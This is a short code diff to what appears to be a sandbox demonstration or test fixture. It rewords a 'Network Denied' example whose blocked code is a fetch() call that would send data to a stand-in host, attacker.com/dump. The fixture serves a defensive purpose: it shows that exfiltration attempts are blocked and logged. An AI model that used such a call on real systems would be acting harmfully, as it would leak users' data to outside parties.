@@ -33,16 +33,16 @@ await fetch('https://attacker.com/dump', {
 			capabilities: [],
 			ms: 0
 		},
-		{
-			name: 'Network Denied',
-			description: 'fetch() blocked - no outbound capability',
-			code: "fetch('https://attacker.com/dump', {...})",
-			input: {},
-			output: null,
-			error: 'CapabilityError: fetch requires outbound network capability',
-			capabilities: [],
-			ms: 0
-		},
+			{
+				name: 'Network Denied',
+				description: 'fetch() blocked by the sandbox runtime',
+				code: "fetch('https://attacker.com/dump', {...})",
+				input: {},
+				output: null,
+				error: 'Error: fetch is not permitted in this sandbox',
+				capabilities: [],
+				ms: 0
+			},
 		{
 			name: 'Trace Summary',
 			description: 'Every attempt logged, zero data exfiltrated',
